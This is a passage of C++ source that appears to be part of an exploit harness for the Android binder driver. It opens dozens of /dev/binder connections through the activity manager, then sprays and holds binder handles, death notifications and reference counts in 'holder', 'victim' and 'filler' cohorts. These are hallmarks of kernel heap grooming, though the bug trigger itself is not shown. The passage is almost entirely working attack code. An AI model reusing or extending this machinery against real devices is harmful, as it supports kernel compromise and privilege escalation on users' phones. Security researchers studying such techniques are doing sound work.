        get_service.code = kServiceManagerGetService;
        get_service.data_size = service.data.size();
        get_service.data.ptr.buffer =
                reinterpret_cast<binder_uintptr_t>(service.data.data());
        BinderReply service_reply = transact_and_read(fd, get_service);
        int activity_handle = -1;
        if (service_reply.buffer != 0 &&
                service_reply.offsets_size >= sizeof(binder_size_t)) {
            binder_size_t offset = 0;
            std::memcpy(&offset,
                    reinterpret_cast<const void*>(service_reply.offsets),
                    sizeof(offset));
            if (offset <= service_reply.data_size &&
                    service_reply.data_size - offset >=
                            sizeof(flat_binder_object)) {
                flat_binder_object object {};
                std::memcpy(&object,
                        reinterpret_cast<const std::uint8_t*>(
                                service_reply.buffer) + offset,
                        sizeof(object));
                if (object.hdr.type == BINDER_TYPE_HANDLE) {
                    activity_handle = static_cast<int>(object.handle);
                }
            }
        }

        binder_transaction_data start_request {};
        start_request.target.handle = static_cast<std::uint32_t>(
                std::max(activity_handle, 0));
        start_request.code = kActivityManagerStartService;
        start_request.data_size = start.data.size();
        start_request.offsets_size = start.object_offsets.size() *
                sizeof(binder_size_t);
        start_request.data.ptr.buffer =
                reinterpret_cast<binder_uintptr_t>(start.data.data());
        start_request.data.ptr.offsets =
                reinterpret_cast<binder_uintptr_t>(
                        start.object_offsets.data());
        BinderReply start_reply = activity_handle > 0
                ? transact_and_read(fd, start_request) : BinderReply {};
        std::int32_t exception = INT32_MIN;
        if (start_reply.buffer != 0 &&
                start_reply.data_size >= sizeof(exception)) {
            std::memcpy(&exception,
                    reinterpret_cast<const void*>(start_reply.buffer),
                    sizeof(exception));
        }
        bool start_pass = start_reply.ioctl_result == 0 &&
                start_reply.buffer != 0 && exception == 0;
        std::uint32_t enter = BC_ENTER_LOOPER;
        bool entered = start_pass && write_binder_commands(
                fd, &enter, sizeof(enter)) == 0;
        int original_flags = fcntl(fd, F_GETFL, 0);
        bool nonblocking = entered && original_flags >= 0 &&
                fcntl(fd, F_SETFL, original_flags | O_NONBLOCK) == 0;
        binder_uintptr_t callback_buffer = 0;
        int marker_handle = -1;
        std::uint32_t prefix = 0;
        bool callback_target = false;
        auto deadline = std::chrono::steady_clock::now() +
                std::chrono::seconds(5);
        while (nonblocking && marker_handle <= 0 &&
                std::chrono::steady_clock::now() < deadline) {
            pollfd descriptor {fd, POLLIN, 0};
            int wait = static_cast<int>(std::max<std::int64_t>(1,
                    std::chrono::duration_cast<std::chrono::milliseconds>(
                            deadline -
                            std::chrono::steady_clock::now()).count()));
            int poll_result = poll(&descriptor, 1, wait);
            if (poll_result < 0 && errno == EINTR) {
                continue;
            }
            if (poll_result <= 0) {
                break;
            }
            std::uint8_t read_buffer[4096] {};
            binder_write_read request {};
            request.read_size = sizeof(read_buffer);
            request.read_buffer = reinterpret_cast<binder_uintptr_t>(
                    read_buffer);
            if (ioctl(fd, BINDER_WRITE_READ, &request) != 0) {
                if (errno == EINTR || errno == EAGAIN) {
                    continue;
                }
                break;
            }
            for (std::size_t cursor = 0;
                 cursor + sizeof(std::uint32_t) <=
                         request.read_consumed;) {
                std::uint32_t response = 0;
                std::memcpy(&response, read_buffer + cursor,
                        sizeof(response));
                cursor += sizeof(response);
                std::size_t payload_size = _IOC_SIZE(response);
                if (cursor + payload_size > request.read_consumed) {
                    break;
                }
                if (response == BR_TRANSACTION && payload_size >=
                            sizeof(binder_transaction_data)) {
                    binder_transaction_data transaction {};
                    std::memcpy(&transaction, read_buffer + cursor,
                            sizeof(transaction));
                    callback_target =
                            transaction.code == kBrokerCallbackCode &&
                            transaction.target.ptr ==
                                    route->callback_identity[0] &&
                            transaction.cookie ==
                                    route->callback_identity[1];
                    std::size_t object_count = transaction.offsets_size /
                            sizeof(binder_size_t);
                    if (callback_target && object_count == 1 &&
                            transaction.data_size >= sizeof(prefix)) {
                        const auto* data =
                                reinterpret_cast<const std::uint8_t*>(
                                        transaction.data.ptr.buffer);
                        const auto* offsets =
                                reinterpret_cast<const binder_size_t*>(
                                        transaction.data.ptr.offsets);
                        std::memcpy(&prefix, data, sizeof(prefix));
                        binder_size_t offset = offsets[0];
                        if (offset <= transaction.data_size &&
                                transaction.data_size - offset >=
                                        sizeof(flat_binder_object)) {
                            flat_binder_object object {};
                            std::memcpy(&object, data + offset,
                                    sizeof(object));
                            if (object.hdr.type == BINDER_TYPE_HANDLE) {
                                marker_handle = static_cast<int>(
                                        object.handle);
                                callback_buffer =
                                        transaction.data.ptr.buffer;
                            }
                        }
                    }
                }
                cursor += payload_size;
            }
        }
        if (original_flags >= 0) {
            fcntl(fd, F_SETFL, original_flags);
        }
        std::string descriptor = marker_handle > 0
                ? query_descriptor(fd, marker_handle) : std::string();
        bool pass = start_pass && entered && nonblocking &&
                callback_target && prefix == kBrokerProof &&
                marker_handle > 0 && descriptor == kMarkerDescriptor &&
                callback_buffer != 0;
        if (callback_buffer != 0) {
            pass = free_buffer(fd, callback_buffer) && pass;
        }
        if (start_reply.buffer != 0) {
            pass = free_buffer(fd, start_reply.buffer) && pass;
        }
        if (service_reply.buffer != 0) {
            pass = free_buffer(fd, service_reply.buffer) && pass;
        }
        if (!pass) {
            munmap(mapping, kBinderMappingSize);
            close(fd);
            return false;
        }
        route->fd = fd;
        route->mapping = mapping;
        return true;
    };

    std::atomic<int> next_index {0};
    std::vector<int> opened(state->routes.size());
    int worker_count = std::min(holder_count, 64);
    std::vector<std::thread> workers;
    workers.reserve(worker_count);
    for (int worker = 0; worker < worker_count; ++worker) {
        workers.emplace_back([&]() {
            for (;;) {
                int index = next_index.fetch_add(1);
                if (index >= holder_count) {
                    return;
                }
                opened[index] = open_route(
                        index, &state->routes[index]) ? 1 : 0;
            }
        });
    }
    for (std::thread& worker : workers) {
        worker.join();
    }
    int opened_count = static_cast<int>(
            std::count(opened.begin(), opened.end(), 1));
    if (opened_count != holder_count) {
        for (State::Route& route : state->routes) {
            if (route.mapping != MAP_FAILED) {
                munmap(route.mapping, kBinderMappingSize);
            }
            if (route.fd >= 0) {
                close(route.fd);
            }
        }
        result.duration_nanoseconds = boot_nanoseconds() - started;
        result.detail = "status=fail reason=route opened=" +
                std::to_string(opened_count) + " expected=" +
                std::to_string(holder_count);
        if (output != nullptr) {
            *output = result;
        }
        emit(sink, sink_context, started, result.stage.c_str(),
                result.detail);
        return nullptr;
    }

    result.passed = true;
    result.duration_nanoseconds = boot_nanoseconds() - started;
    result.detail = "status=pass routes=" +
            std::to_string(holder_count) + " workers=" +
            std::to_string(worker_count);
    emit(sink, sink_context, started, result.stage.c_str(), result.detail);
    if (output != nullptr) {
        *output = result;
    }
    return std::unique_ptr<HolderCohort>(
            new HolderCohort(std::move(state)));
}

Result HolderCohort::receive(int requested_holder_count,
                             int fixed_refs_per_holder,
                             std::int32_t expected_proof,
                             int death_object_index) {
    constexpr std::uint32_t kHolderCode = 0x42b1;
    constexpr std::int32_t kFillerMinimum = 20;
    constexpr std::int32_t kFillerVariants = 8;
    const std::uint64_t started = boot_nanoseconds();
    Result result;
    result.stage = "holder-cohort-receive";
    int available_holder_count = state_ == nullptr
            ? 0 : static_cast<int>(state_->routes.size());
    int holder_count = requested_holder_count;
    bool dynamic_counts = fixed_refs_per_holder == 0;
    bool interleaved_marker = fixed_refs_per_holder == -1;
    bool pass = state_ != nullptr && !state_->released &&
            holder_count > 0 && holder_count <= available_holder_count &&
            available_holder_count <= 512 &&
            fixed_refs_per_holder >= -1 && fixed_refs_per_holder <= 256 &&
            expected_proof > 0 && death_object_index >= -2 &&
            (!dynamic_counts ||
             (holder_count >= kFillerVariants &&
              holder_count % kFillerVariants == 0));
    int received = 0;
    int handles = 0;
    int expected_handles = 0;
    int completions = 0;
    int failed_index = pass ? -1 : 0;
    for (int index = 0; pass && index < holder_count; ++index) {
        State::Route& route = state_->routes[index];
        std::int32_t expected_count = interleaved_marker
                ? (index % (holder_count / 8) == 0 ? 2 : 1)
                : dynamic_counts
                ? kFillerMinimum + index /
                        (holder_count / kFillerVariants) +
                        (death_object_index == -1 ? 1 : 2)
                : fixed_refs_per_holder;
        int death_index = interleaved_marker
                ? (expected_count == 2 ? 1 : -1)
                : death_object_index == -2
                ? expected_count - 1 : death_object_index;
        if (death_index >= expected_count) {
            failed_index = index;
            pass = false;
            break;
        }
        expected_handles += expected_count;
        std::uint32_t enter = BC_ENTER_LOOPER;
        if (write_binder_commands(route.fd, &enter, sizeof(enter)) != 0) {
            failed_index = index;
            pass = false;
            break;
        }
        auto deadline = std::chrono::steady_clock::now() +
                std::chrono::seconds(5);
        bool found = false;
        while (!found && std::chrono::steady_clock::now() < deadline) {
            pollfd descriptor {route.fd, POLLIN, 0};
            int wait = static_cast<int>(std::max<std::int64_t>(1,
                    std::chrono::duration_cast<std::chrono::milliseconds>(
                            deadline -
                            std::chrono::steady_clock::now()).count()));
            int poll_result = poll(&descriptor, 1, wait);
            if (poll_result < 0 && errno == EINTR) {
                continue;
            }
            if (poll_result <= 0) {
                break;
            }
            std::uint8_t read_buffer[4096] {};
            binder_write_read request {};
            request.read_size = sizeof(read_buffer);
            request.read_buffer = reinterpret_cast<binder_uintptr_t>(
                    read_buffer);
            if (ioctl(route.fd, BINDER_WRITE_READ, &request) != 0) {
                if (errno == EINTR) {
                    continue;
                }
                break;
            }
            for (std::size_t cursor = 0;
                 cursor + sizeof(std::uint32_t) <=
                         request.read_consumed;) {
                std::uint32_t response = 0;
                std::memcpy(&response, read_buffer + cursor,
                        sizeof(response));
                cursor += sizeof(response);
                std::size_t payload_size = _IOC_SIZE(response);
                if (cursor + payload_size > request.read_consumed) {
                    break;
                }
                if (response == BR_TRANSACTION && payload_size >=
                            sizeof(binder_transaction_data)) {
                    binder_transaction_data transaction {};
                    std::memcpy(&transaction, read_buffer + cursor,
                            sizeof(transaction));
                    bool target = transaction.code == kHolderCode &&
                            transaction.target.ptr ==
                                    route.callback_identity[0] &&
                            transaction.cookie ==
                                    route.callback_identity[1] &&
                            !(transaction.flags & TF_ONE_WAY);
                    std::uint32_t proof = 0;
                    std::int32_t count = 0;
                    if (target && transaction.data_size >=
                                sizeof(proof) + sizeof(count) &&
                            transaction.offsets_size ==
                                    static_cast<binder_size_t>(
                                            expected_count) *
                                            sizeof(binder_size_t)) {
                        const auto* data =
                                reinterpret_cast<const std::uint8_t*>(
                                        transaction.data.ptr.buffer);
                        const auto* offsets =
                                reinterpret_cast<const binder_size_t*>(
                                        transaction.data.ptr.offsets);
                        std::memcpy(&proof, data, sizeof(proof));
                        std::memcpy(&count, data + sizeof(proof),
                                sizeof(count));
                        std::set<std::uint32_t> unique_handles;
                        std::vector<std::uint32_t> ordered_handles;
                        ordered_handles.reserve(expected_count);
                        bool objects = proof ==
                                        static_cast<std::uint32_t>(
                                                expected_proof) &&
                                count == expected_count;
                        for (int object_index = 0;
                             objects && object_index < count;
                             ++object_index) {
                            binder_size_t object_offset =
                                    offsets[object_index];
                            if (object_offset > transaction.data_size ||
                                    transaction.data_size - object_offset <
                                            sizeof(flat_binder_object)) {
                                objects = false;
                                break;
                            }
                            flat_binder_object object {};
                            std::memcpy(&object, data + object_offset,
                                    sizeof(object));
                            objects = object.hdr.type ==
                                            BINDER_TYPE_HANDLE &&
                                    unique_handles.insert(
                                            object.handle).second;
                            if (objects) {
                                ordered_handles.push_back(object.handle);
                            }
                        }
                        std::set<std::uint32_t> retained_handles(
                                route.handles.begin(), route.handles.end());
                        for (std::uint32_t handle : ordered_handles) {
                            objects = objects &&
                                    retained_handles.insert(handle).second;
                        }
                        if (objects && unique_handles.size() ==
                                    static_cast<std::size_t>(count)) {
                            constexpr std::size_t kHandleCommandSize =
                                    sizeof(std::uint32_t) +
                                    sizeof(std::uint32_t);
                            constexpr std::size_t kReplyCommandSize =
                                    sizeof(std::uint32_t) +
                                    sizeof(binder_transaction_data);
                            constexpr std::size_t kFreeCommandSize =
                                    sizeof(std::uint32_t) +
                                    sizeof(binder_uintptr_t);
                            constexpr std::size_t kDeathCommandSize =
                                    sizeof(std::uint32_t) +
                                    sizeof(binder_handle_cookie);
                            bool request_death = death_index >= 0;
                            std::vector<std::uint8_t> commands(
                                    ordered_handles.size() * 2 *
                                            kHandleCommandSize +
                                    kReplyCommandSize + kFreeCommandSize +
                                    (request_death
                                            ? kDeathCommandSize : 0));
                            std::size_t command_offset = 0;
                            for (std::uint32_t handle : ordered_handles) {
                                write_command(commands.data() +
                                                command_offset,
                                        BC_INCREFS, &handle,
                                        sizeof(handle));
                                command_offset += kHandleCommandSize;
                                write_command(commands.data() +
                                                command_offset,
                                        BC_ACQUIRE, &handle,
                                        sizeof(handle));
                                command_offset += kHandleCommandSize;
                            }
                            binder_handle_cookie death {};
                            if (request_death) {
                                death.handle =
                                        ordered_handles[death_index];
                                death.cookie =
                                        UINT64_C(0x5244480000000000) |
                                        static_cast<binder_uintptr_t>(index);
                                write_command(commands.data() +
                                                command_offset,
                                        BC_REQUEST_DEATH_NOTIFICATION,
                                        &death, sizeof(death));
                                command_offset += kDeathCommandSize;
                            }
                            binder_uintptr_t incoming_buffer =
                                    transaction.data.ptr.buffer;
                            write_command(commands.data() + command_offset,
                                    BC_FREE_BUFFER, &incoming_buffer,
                                    sizeof(incoming_buffer));
                            command_offset += kFreeCommandSize;
                            std::int32_t reply_data[2] {
                                    0, expected_proof};
                            binder_transaction_data reply {};
                            reply.data_size = sizeof(reply_data);
                            reply.data.ptr.buffer =
                                    reinterpret_cast<binder_uintptr_t>(
                                            reply_data);
                            write_command(commands.data() + command_offset,
                                    BC_REPLY, &reply, sizeof(reply));
                            command_offset += kReplyCommandSize;
                            bool completed = command_offset ==
                                            commands.size() &&
                                    write_binder_commands(route.fd,
                                            commands.data(),
                                            commands.size()) == 0;
                            if (completed) {
                                route.handles.insert(route.handles.end(),
                                        ordered_handles.begin(),
                                        ordered_handles.end());
                                if (request_death) {
                                    route.death_notifications.push_back(
                                            death);
                                }
                                handles += count;
                                completions +=
                                        drain_transaction_complete(
                                                route.fd) ? 1 : 0;
                                found = true;
                            }
                        }
                    }
                }
                cursor += payload_size;
            }
        }
        if (!found) {
            failed_index = index;
            pass = false;
            break;
        }
        ++received;
    }
    pass = pass && received == holder_count &&
            handles == expected_handles && completions == holder_count;
    result.passed = pass;
    result.duration_nanoseconds = boot_nanoseconds() - started;
    result.detail = "status=" + std::string(pass ? "pass" : "fail") +
            " requested=" + std::to_string(holder_count) +
            " received=" + std::to_string(received) +
            " mode=" + (interleaved_marker ? "interleaved-marker" :
                    dynamic_counts ? "controlled" : "prime") +
            " fixed_refs=" + std::to_string(fixed_refs_per_holder) +
            " handles=" + std::to_string(handles) +
            " expected_handles=" + std::to_string(expected_handles) +
            " completions=" + std::to_string(completions) +
            " failed_index=" + std::to_string(failed_index);
    return result;
}

Result HolderCohort::release_handles(
        int expected_handles, int expected_deaths) {
    const std::uint64_t started = boot_nanoseconds();
    Result result;
    result.stage = "holder-cohort-release-handles";
    int retained = 0;
    int retained_deaths = 0;
    if (state_ != nullptr) {
        for (const State::Route& route : state_->routes) {
            retained += static_cast<int>(route.handles.size());
            retained_deaths += static_cast<int>(
                    route.death_notifications.size());
        }
    }
    bool pass = state_ != nullptr && !state_->released &&
            !state_->routes.empty() && expected_handles > 0 &&
            expected_deaths >= 0 && retained == expected_handles &&
            retained_deaths == expected_deaths;
    int released = 0;
    int cleared_deaths = 0;
    int failed_route = -1;
    for (int route_index = 0; pass && route_index <
            static_cast<int>(state_->routes.size()); ++route_index) {
        State::Route& route = state_->routes[route_index];
        std::uint32_t enter = BC_ENTER_LOOPER;
        bool route_pass = route.fd >= 0 &&
                write_binder_commands(route.fd, &enter, sizeof(enter)) == 0;
        std::size_t cleared_on_route = 0;
        for (const binder_handle_cookie& death :
             route.death_notifications) {
            std::uint8_t command[sizeof(std::uint32_t) +
                    sizeof(death)] {};
            write_command(command, BC_CLEAR_DEATH_NOTIFICATION,
                    &death, sizeof(death));
            if (!route_pass || write_binder_commands(
                    route.fd, command, sizeof(command)) != 0 ||
                    !drain_clear_death(route.fd, death.cookie)) {
                route_pass = false;
                break;
            }
            ++cleared_on_route;
            ++cleared_deaths;
        }
        route.death_notifications.erase(
                route.death_notifications.begin(),
                route.death_notifications.begin() + cleared_on_route);
        std::size_t released_on_route = 0;
        for (std::uint32_t handle : route.handles) {
            std::uint8_t commands[
                    2 * (sizeof(std::uint32_t) + sizeof(handle))] {};
            write_command(commands, BC_RELEASE, &handle, sizeof(handle));
            write_command(commands + sizeof(std::uint32_t) +
                            sizeof(handle),
                    BC_DECREFS, &handle, sizeof(handle));
            if (!route_pass || write_binder_commands(
                    route.fd, commands, sizeof(commands)) != 0) {
                route_pass = false;
                break;
            }
            ++released_on_route;
            ++released;
        }
        route.handles.erase(route.handles.begin(),
                route.handles.begin() + released_on_route);
        if (!route_pass || !route.handles.empty() ||
                !route.death_notifications.empty()) {
            failed_route = route_index;
            pass = false;
        }
    }
    if (state_ != nullptr) {
        state_->released_handles += released;
        state_->cleared_death_notifications += cleared_deaths;
    }
    pass = pass && released == expected_handles &&
            cleared_deaths == expected_deaths;
    result.passed = pass;
    result.duration_nanoseconds = boot_nanoseconds() - started;
    result.detail = "status=" + std::string(pass ? "pass" : "fail") +
            " retained=" + std::to_string(retained) +
            " released=" + std::to_string(released) +
            " expected=" + std::to_string(expected_handles) +
            " retained_deaths=" + std::to_string(retained_deaths) +
            " deaths_cleared=" + std::to_string(cleared_deaths) +
            " expected_deaths=" + std::to_string(expected_deaths) +
            " failed_route=" + std::to_string(failed_route);
    return result;
}

Result HolderCohort::release(HolderReleaseReceipt* receipt) {
    const std::uint64_t started = boot_nanoseconds();
    Result result;
    result.stage = "holder-cohort-release";
    HolderReleaseReceipt counts;
    if (state_ != nullptr) {
        counts.handles = state_->released_handles;
        counts.death_notifications =
                state_->cleared_death_notifications;
    }
    bool pass = state_ != nullptr && !state_->released &&
            !state_->routes.empty();
    for (State::Route& route : state_->routes) {
        bool route_pass = route.fd >= 0 && route.mapping != MAP_FAILED;
        std::uint32_t enter = BC_ENTER_LOOPER;
        route_pass = route_pass && write_binder_commands(
                route.fd, &enter, sizeof(enter)) == 0;
        for (const binder_handle_cookie& death :
             route.death_notifications) {
            std::uint8_t command[sizeof(std::uint32_t) +
                    sizeof(death)] {};
            write_command(command, BC_CLEAR_DEATH_NOTIFICATION,
                    &death, sizeof(death));
            bool cleared = route_pass &&
                    write_binder_commands(route.fd, command,
                            sizeof(command)) == 0 &&
                    drain_clear_death(route.fd, death.cookie);
            route_pass = route_pass && cleared;
            counts.death_notifications += cleared ? 1 : 0;
        }
        for (std::uint32_t handle : route.handles) {
            std::uint8_t commands[
                    2 * (sizeof(std::uint32_t) + sizeof(handle))] {};
            write_command(commands, BC_RELEASE, &handle, sizeof(handle));
            write_command(commands + sizeof(std::uint32_t) +
                            sizeof(handle),
                    BC_DECREFS, &handle, sizeof(handle));
            bool released = route_pass && write_binder_commands(
                    route.fd, commands, sizeof(commands)) == 0;
            route_pass = route_pass && released;
            counts.handles += released ? 1 : 0;
        }
        bool unmapped = route.mapping != MAP_FAILED &&
                munmap(route.mapping, kBinderMappingSize) == 0;
        route.mapping = MAP_FAILED;
        bool closed = route.fd >= 0 && close(route.fd) == 0;
        route.fd = -1;
        counts.mappings += unmapped ? 1 : 0;
        counts.descriptors += closed ? 1 : 0;
        counts.contexts += route_pass && unmapped && closed ? 1 : 0;
        pass = pass && route_pass && unmapped && closed;
    }
    int expected_handles = state_->released_handles;
    int expected_deaths = state_->cleared_death_notifications;
    for (const State::Route& route : state_->routes) {
        expected_handles += static_cast<int>(route.handles.size());
        expected_deaths += static_cast<int>(
                route.death_notifications.size());
    }
    pass = pass && counts.contexts ==
                    static_cast<int>(state_->routes.size()) &&
            counts.handles == expected_handles &&
            counts.death_notifications == expected_deaths &&
            counts.mappings == static_cast<int>(state_->routes.size()) &&
            counts.descriptors == static_cast<int>(state_->routes.size());
    state_->released = true;
    if (receipt != nullptr) {
        *receipt = counts;
    }
    result.passed = pass;
    result.duration_nanoseconds = boot_nanoseconds() - started;
    result.detail = "status=" + std::string(pass ? "pass" : "fail") +
            " contexts=" + std::to_string(counts.contexts) +
            " handles=" + std::to_string(counts.handles) +
            " expected_handles=" + std::to_string(expected_handles) +
            " death_notifications=" +
                    std::to_string(counts.death_notifications) +
            " expected_deaths=" + std::to_string(expected_deaths) +
            " mappings=" + std::to_string(counts.mappings) +
            " descriptors=" + std::to_string(counts.descriptors);
    return result;
}

struct VictimCohort::State {
    struct Route {
        int fd = -1;
        void* mapping = MAP_FAILED;
        std::array<std::uint64_t, 2> callback_identity {};
        int target_handle = -1;
        int exported_handle = -1;
        VictimToken token;
        bool export_passed = false;
        bool retired = false;
        std::thread export_thread;
    };

    explicit State(int count) : routes(static_cast<std::size_t>(count)) {}

    std::vector<Route> routes;
    bool collected = false;
    bool released = false;
};

VictimCohort::VictimCohort(std::unique_ptr<State> state)
    : state_(std::move(state)) {}

std::unique_ptr<VictimCohort> VictimCohort::create(
        const char* service_template_path,
        const char* start_template_path,
        int victim_count,
        Result* output,
        EventSink sink,
        void* sink_context) {
    const std::uint64_t started = boot_nanoseconds();
    Result result;
    result.stage = "victim-cohort-create";
    ParcelTemplate service;
    ParcelTemplate start_template;
    int template_error = 0;
    bool templates = victim_count > 0 && victim_count <= 127 &&
            load_template(service_template_path, &service,
                    &template_error) &&
            load_template(start_template_path, &start_template,
                    &template_error) &&
            service.object_offsets.empty() &&
            start_template.object_offsets.size() == 1;
    if (!templates) {
        result.duration_nanoseconds = boot_nanoseconds() - started;
        result.detail = "status=fail reason=template errno=" +
                std::to_string(template_error);
        if (output != nullptr) {
            *output = result;
        }
        emit(sink, sink_context, started, result.stage.c_str(),
                result.detail);
        return nullptr;
    }

    auto state = std::make_unique<State>(victim_count);
    auto open_route = [&](State::Route* route) {
        ParcelTemplate start = start_template;
        flat_binder_object callback {};
        std::memcpy(&callback,
                start.data.data() + start.object_offsets.front(),
                sizeof(callback));
        if (callback.hdr.type != BINDER_TYPE_BINDER) {
            return false;
        }
        route->callback_identity[0] =
                reinterpret_cast<std::uintptr_t>(
                        &route->callback_identity[0]);
        route->callback_identity[1] =
                reinterpret_cast<std::uintptr_t>(
                        &route->callback_identity[1]);
        callback.binder = route->callback_identity[0];
        callback.cookie = route->callback_identity[1];
        std::memcpy(start.data.data() + start.object_offsets.front(),
                &callback, sizeof(callback));

        int fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
        binder_version version {};
        void* mapping = MAP_FAILED;
        if (fd >= 0 && ioctl(fd, BINDER_VERSION, &version) == 0 &&
                version.protocol_version == 8) {
            mapping = mmap(nullptr, kBinderMappingSize, PROT_READ,
                    MAP_PRIVATE | MAP_NORESERVE, fd, 0);
        }
        if (fd < 0 || mapping == MAP_FAILED) {
            if (fd >= 0) {
                close(fd);
            }
            return false;
        }

        binder_transaction_data get_service {};
        get_service.target.handle = 0;
        get_service.code = kServiceManagerGetService;
        get_service.data_size = service.data.size();
        get_service.data.ptr.buffer =
                reinterpret_cast<binder_uintptr_t>(service.data.data());
        BinderReply service_reply = transact_and_read(fd, get_service);
        int activity_handle = -1;
        if (service_reply.buffer != 0 &&
                service_reply.offsets_size >= sizeof(binder_size_t)) {
            binder_size_t offset = 0;
            std::memcpy(&offset,
                    reinterpret_cast<const void*>(service_reply.offsets),
                    sizeof(offset));
            if (offset <= service_reply.data_size &&
                    service_reply.data_size - offset >=
                            sizeof(flat_binder_object)) {
                flat_binder_object object {};
                std::memcpy(&object,
                        reinterpret_cast<const std::uint8_t*>(
                                service_reply.buffer) + offset,
                        sizeof(object));
                if (object.hdr.type == BINDER_TYPE_HANDLE) {
                    activity_handle = static_cast<int>(object.handle);
                }
            }
        }

        binder_transaction_data start_request {};
        start_request.target.handle = static_cast<std::uint32_t>(
                std::max(activity_handle, 0));
        start_request.code = kActivityManagerStartService;
        start_request.data_size = start.data.size();
        start_request.offsets_size = start.object_offsets.size() *
                sizeof(binder_size_t);
        start_request.data.ptr.buffer =
                reinterpret_cast<binder_uintptr_t>(start.data.data());
        start_request.data.ptr.offsets =
                reinterpret_cast<binder_uintptr_t>(
                        start.object_offsets.data());
        BinderReply start_reply = activity_handle > 0
                ? transact_and_read(fd, start_request) : BinderReply {};
        std::int32_t exception = INT32_MIN;
        if (start_reply.buffer != 0 &&
                start_reply.data_size >= sizeof(exception)) {
            std::memcpy(&exception,
                    reinterpret_cast<const void*>(start_reply.buffer),
                    sizeof(exception));
        }
        bool start_pass = start_reply.ioctl_result == 0 &&
                start_reply.buffer != 0 && exception == 0;
        std::uint32_t enter = BC_ENTER_LOOPER;
        bool entered = start_pass && write_binder_commands(
                fd, &enter, sizeof(enter)) == 0;
        int original_flags = fcntl(fd, F_GETFL, 0);
        bool nonblocking = entered && original_flags >= 0 &&
                fcntl(fd, F_SETFL, original_flags | O_NONBLOCK) == 0;
        binder_uintptr_t callback_buffer = 0;
        int marker_handle = -1;
        int target_handle = -1;
        std::uint32_t prefix = 0;
        bool callback_target = false;
        auto deadline = std::chrono::steady_clock::now() +
                std::chrono::seconds(5);
        while (nonblocking && marker_handle <= 0 &&
                std::chrono::steady_clock::now() < deadline) {
            pollfd descriptor {fd, POLLIN, 0};
            int wait = static_cast<int>(std::max<std::int64_t>(1,
                    std::chrono::duration_cast<std::chrono::milliseconds>(
                            deadline -
                            std::chrono::steady_clock::now()).count()));
            int poll_result = poll(&descriptor, 1, wait);
            if (poll_result < 0 && errno == EINTR) {
                continue;
            }
            if (poll_result <= 0) {
                break;
            }
            std::uint8_t read_buffer[4096] {};
            binder_write_read request {};
            request.read_size = sizeof(read_buffer);
            request.read_buffer = reinterpret_cast<binder_uintptr_t>(
                    read_buffer);
            if (ioctl(fd, BINDER_WRITE_READ, &request) != 0) {
                if (errno == EINTR || errno == EAGAIN) {
                    continue;
                }
                break;
            }
            for (std::size_t cursor = 0;
                 cursor + sizeof(std::uint32_t) <=
                         request.read_consumed;) {
                std::uint32_t response = 0;
                std::memcpy(&response, read_buffer + cursor,
                        sizeof(response));
                cursor += sizeof(response);
                std::size_t payload_size = _IOC_SIZE(response);
                if (cursor + payload_size > request.read_consumed) {
                    break;
                }
                if (response == BR_TRANSACTION && payload_size >=
                            sizeof(binder_transaction_data)) {
                    binder_transaction_data transaction {};
                    std::memcpy(&transaction, read_buffer + cursor,
                            sizeof(transaction));
                    callback_target =
                            transaction.code == kBrokerCallbackCode &&
                            transaction.target.ptr ==
                                    route->callback_identity[0] &&
                            transaction.cookie ==
                                    route->callback_identity[1];
                    std::size_t object_count = transaction.offsets_size /
                            sizeof(binder_size_t);
                    if (callback_target &&
                            transaction.data_size >= sizeof(prefix) &&
                            object_count == 2) {
                        const auto* data =
                                reinterpret_cast<const std::uint8_t*>(
                                        transaction.data.ptr.buffer);
                        const auto* offsets =
                                reinterpret_cast<const binder_size_t*>(
                                        transaction.data.ptr.offsets);
                        std::memcpy(&prefix, data, sizeof(prefix));
                        for (std::size_t object_index = 0;
                             object_index < object_count; ++object_index) {
                            binder_size_t offset = offsets[object_index];
                            if (offset > transaction.data_size ||
                                    transaction.data_size - offset <
                                            sizeof(flat_binder_object)) {
                                marker_handle = -1;
                                target_handle = -1;
                                break;
                            }
                            flat_binder_object object {};
                            std::memcpy(&object, data + offset,
                                    sizeof(object));
                            if (object.hdr.type == BINDER_TYPE_HANDLE) {
                                if (object_index == 0) {
                                    marker_handle = static_cast<int>(
                                            object.handle);
                                } else {
                                    target_handle = static_cast<int>(
                                            object.handle);
                                }
                            }
                        }
                        if (marker_handle > 0 && target_handle > 0) {
                            callback_buffer =
                                    transaction.data.ptr.buffer;
                        }
                    }
                }
                cursor += payload_size;
            }
        }
        if (original_flags >= 0) {
            fcntl(fd, F_SETFL, original_flags);
        }
        std::string descriptor = marker_handle > 0
                ? query_descriptor(fd, marker_handle) : std::string();
        bool pass = start_pass && entered && nonblocking &&
                callback_target && prefix == kBrokerProof &&
                marker_handle > 0 && target_handle > 0 &&
                descriptor == kMarkerDescriptor && callback_buffer != 0;
        if (pass) {
            constexpr std::size_t kHandleCommandSize =
                    sizeof(std::uint32_t) + sizeof(std::uint32_t);
            constexpr std::size_t kFreeCommandSize =
                    sizeof(std::uint32_t) + sizeof(binder_uintptr_t);
            std::uint8_t commands[
                    2 * kHandleCommandSize + kFreeCommandSize] {};
            write_command(commands, BC_INCREFS, &target_handle,
                    sizeof(target_handle));
            write_command(commands + kHandleCommandSize,
                    BC_ACQUIRE, &target_handle,
                    sizeof(target_handle));
            write_command(commands + 2 * kHandleCommandSize,
                    BC_FREE_BUFFER, &callback_buffer,
                    sizeof(callback_buffer));
            pass = write_binder_commands(
                    fd, commands, sizeof(commands)) == 0;
            callback_buffer = 0;
        }
        if (callback_buffer != 0) {
            free_buffer(fd, callback_buffer);
        }
        if (start_reply.buffer != 0) {
            free_buffer(fd, start_reply.buffer);
        }
        if (service_reply.buffer != 0) {
            free_buffer(fd, service_reply.buffer);
        }
        if (!pass) {
            munmap(mapping, kBinderMappingSize);
            close(fd);
            return false;
        }
        route->fd = fd;
        route->mapping = mapping;
        route->target_handle = target_handle;
        return true;
    };

    std::vector<std::thread> route_workers;
    route_workers.reserve(state->routes.size());
    std::vector<int> opened(state->routes.size());
    for (std::size_t index = 0; index < state->routes.size(); ++index) {
        route_workers.emplace_back([&, index]() {
            opened[index] = open_route(&state->routes[index]) ? 1 : 0;
        });
    }
    for (std::thread& worker : route_workers) {
        worker.join();
    }
    int opened_count = static_cast<int>(
            std::count(opened.begin(), opened.end(), 1));
    if (opened_count != victim_count) {
        for (State::Route& route : state->routes) {
            if (route.mapping != MAP_FAILED) {
                munmap(route.mapping, kBinderMappingSize);
            }
            if (route.fd >= 0) {
                close(route.fd);
            }
        }
